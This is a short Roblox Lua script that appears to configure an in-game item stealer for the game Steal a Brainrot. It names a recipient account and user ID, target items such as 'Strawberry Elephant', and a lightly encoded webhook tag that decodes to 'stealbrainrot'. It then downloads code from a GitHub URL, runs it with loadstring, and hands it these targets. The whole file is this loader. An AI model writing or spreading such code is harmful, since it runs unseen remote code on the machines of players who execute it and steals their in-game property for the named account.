local TARGET_ID = 1389146756
local TARGET_USER = "Ero059"

WebhookEncrypted = "115,116,101,97,108,98,114,97,105,110,114,111,116"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true
}

local TargetBaseSkins = {
    ["Lucky"] = true
}

local TargetGears = {
    
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WebhookEncrypted, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)